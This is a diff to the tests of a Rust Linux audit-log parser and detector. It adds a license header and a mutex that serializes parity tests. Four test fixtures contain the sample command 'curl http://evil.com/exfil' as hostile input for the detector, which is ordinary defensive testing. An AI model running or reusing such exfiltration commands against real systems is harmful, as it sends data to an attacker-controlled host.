@@ -1,3 +1,6 @@
+// SPDX-License-Identifier: AGPL-3.0-or-later
+// Copyright (c) 2025-2026 JR Morton
+
 //! Linux audit log parser and tail monitor.
 //!
 //! Parses auditd log lines (SYSCALL, EXECVE, AVC, ANOMALY records) into
@@ -1053,6 +1056,9 @@ mod tests {
     use crate::detect::behavior_adapter::BehaviorDetector;
     use crate::detect::traits::{AlertProposal, DetectionEvent, Detector};
 
+    /// Serializes parity tests that share global ParityState.
+    static PARITY_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
     struct AlwaysEmptyDetector;
 
     impl Detector for AlwaysEmptyDetector {
@@ -1809,6 +1815,7 @@ mod tests {
 
     #[test]
     fn test_shadow_parity_no_mismatch_when_behavior_matches() {
+        let _lock = PARITY_TEST_LOCK.lock().unwrap();
         let event = ParsedEvent {
             syscall_name: "execve".to_string(),
             command: Some("curl http://evil.com/exfil".to_string()),
@@ -1828,6 +1835,7 @@ mod tests {
 
     #[test]
     fn test_shadow_parity_emits_alert_on_mismatch() {
+        let _lock = PARITY_TEST_LOCK.lock().unwrap();
         let event = ParsedEvent {
             syscall_name: "execve".to_string(),
             command: Some("curl http://evil.com/exfil".to_string()),
@@ -1850,6 +1858,7 @@ mod tests {
 
     #[test]
     fn test_shadow_parity_disabled_emits_no_alert() {
+        let _lock = PARITY_TEST_LOCK.lock().unwrap();
         let event = ParsedEvent {
             syscall_name: "execve".to_string(),
             command: Some("curl http://evil.com/exfil".to_string()),
@@ -1869,6 +1878,7 @@ mod tests {
 
     #[test]
     fn test_shadow_parity_dedup_suppresses_repeated_mismatch() {
+        let _lock = PARITY_TEST_LOCK.lock().unwrap();
         let event = ParsedEvent {
             syscall_name: "execve".to_string(),
             command: Some("curl http://evil.com/exfil".to_string()),
